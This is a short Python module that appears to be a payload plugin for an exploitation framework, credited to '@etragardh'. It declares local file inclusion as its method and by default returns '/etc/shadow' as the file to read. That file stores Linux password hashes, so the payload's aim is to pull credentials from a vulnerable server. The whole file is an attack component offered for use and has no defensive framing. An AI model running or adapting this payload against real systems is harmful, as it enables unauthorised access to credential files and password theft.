import os

##
# Dependency
# What dependency does this payload have
def get_methods():
    return ['LFI']

##
# Detonate payload
# Return the code to execute
# or the file path to be uploaded
def get_instructions(method, args):
    if method == 'LFI':
        # If we have LFI
        if args.pos:
            return args.pos
        else:
            return [ "/etc/shadow" ]
##
# Author of this payload
def get_author():
    return "@etragardh"

##
# Special thanks to:
def get_thanks():
    return False

